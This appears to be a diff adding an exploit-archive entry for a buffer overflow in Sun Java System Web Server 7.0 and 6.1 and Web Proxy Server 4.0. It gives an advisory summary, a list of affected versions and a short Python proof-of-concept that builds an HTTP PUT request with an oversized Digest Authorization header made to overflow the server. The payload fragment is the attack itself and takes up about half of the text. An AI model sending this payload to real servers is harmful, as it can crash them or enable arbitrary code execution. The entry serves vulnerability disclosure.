@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/37896/info
+
+Sun Java System Web Server is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.
+
+Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+The issues affects the following:
+
+Sun Java System Web Server 7.0 without Update Release 8
+Sun Java System Web Server 6.1 without Service Pack 12
+Sun Java System Web Proxy Server 4.0 without Service pack 13 
+
+buf = "PUT / HTTP/1.0\n"
+buf += "Authorization: Digest "
+buf += "ABCD,"*1000
+buf += "\n\n" 
